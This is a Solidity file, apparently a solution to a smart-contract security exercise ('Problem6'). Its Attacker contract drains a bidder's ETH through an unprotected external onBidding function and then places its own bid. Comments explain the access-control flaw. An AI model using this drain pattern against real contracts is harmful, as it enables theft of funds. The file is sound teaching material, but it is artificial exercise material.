// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Auction, Bidder} from "../src/Problem6.sol";

contract Attacker {

    Auction trueAuction; // The auction contract to exploit.

    // Alice only sent 1 ETH to the auction. She still has
    // 999 ETH. Because her onBidding function is external
    // and doesn't check who it sends ETH to, we can make
    // it send the remaining 999 ETH to us. Then, we make
    // our own bid.
    function attack(Auction auction, Bidder bidder) public {
        trueAuction = auction;
        bidder.onBidding(998 ether, 0 ether);
        auction.bid();
    }

    // Needed to receive Alice's 999 ETH.
    fallback() external payable {}

    // We implement onBidding like Alice, but we add a check
    // to make sure we are sending ETH to trueAuction only.
    function onBidding(uint256 max_bid, uint256 curr_bid) external {
        require(msg.sender == address(trueAuction),
            "ATTACKER_ERROR: Bid is not being sent to auction!");

        uint256 rem_bid = max_bid - curr_bid + 1 ether;
        payable(msg.sender).call{value: rem_bid}("");
    }

}